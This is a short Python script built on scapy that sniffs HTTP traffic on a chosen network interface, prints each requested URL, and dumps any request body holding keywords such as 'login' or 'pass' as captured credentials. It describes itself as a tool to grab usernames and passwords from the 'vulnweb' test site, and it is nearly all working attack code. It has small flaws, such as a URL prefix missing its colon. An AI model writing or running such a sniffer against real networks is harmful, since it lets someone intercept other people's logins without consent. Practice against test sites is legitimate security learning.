#!/usr/bin/env python3

import re
import sys
import signal
import argparse
import subprocess
import scapy.all as scapy
from scapy.layers import http
from termcolor import colored

def arguments():

    argument = argparse.ArgumentParser(description="Tool to get password and user of vulnweb")
    argument.add_argument('-i', '--interface', dest='iface', help="write your iface")
    argument.add_argument('-wmi', '--what_is_my_iface', action='store_true', dest='help_iface', help='it gets your iface')

    return argument.parse_args()

def exit_ctrl(one, two):

    print(colored(f"[!] Exiting...", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, exit_ctrl)

def get_url(page):

    return "https//" + page[http.HTTPRequest].Host.decode() + page[http.HTTPRequest].Path.decode()

def get_your_iface():

    command = 'ifconfig'
    interface = subprocess.run(command, shell=True, capture_output=True, text=True)
    interface = interface.stdout
    print(interface)

def packet(pack):

    report_list = ["login", "pass", "name", "login"]

    if pack.haslayer(http.HTTPRequest):
        url = get_url(pack)
        print(colored(f"[+] {url}", "green"))
        if pack.haslayer(scapy.Raw):
            request = pack[scapy.Raw].load.decode()
            try:
                for i in report_list:
                    if i in request:
                        print(colored(f"[+] Credentials {request}: ", "magenta"))
                        break
            except:
                pass

def sniff_packets(interface):

    scapy.sniff(iface=interface, prn=packet, store=0)

def main():

    argument = arguments()

    if argument.help_iface:
        get_your_iface()
    else:
        sniff_packets(argument.iface)

if __name__ == "__main__":
    main()